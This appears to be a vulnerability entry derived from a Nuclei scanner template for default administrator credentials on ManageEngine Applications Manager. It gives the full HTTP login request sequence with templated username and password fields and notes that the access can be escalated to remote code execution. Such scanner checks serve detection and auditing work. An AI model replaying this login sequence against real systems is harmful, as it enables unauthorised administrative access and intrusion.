# Vulnerability: ManageEngine Applications Manager - Default Credentials
**Classification:** DEFAULT-LOGIN
**Source:** Nuclei Template (`app-manager-default-login.yaml`)

## Description
Default credentials grants administrative access to ManageEngine Applications Manager, which can be later escalated into a RCE via DB queries.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /index.do HTTP/1.1
Host: {{Hostname}}

POST /j_security_check HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Referer: {{RootURL}}/index.do

clienttype=html&webstart=&j_username=admin&ScreenWidth=1280&ScreenHeight=709&username={{username}}&j_password={{password}}

GET /showresource.do?group=All&method=showResourceTypes&monitor_viewtype=categoryview HTTP/1.1
Host: {{Hostname}}
Referer: {{RootURL}}/j_security_check
```

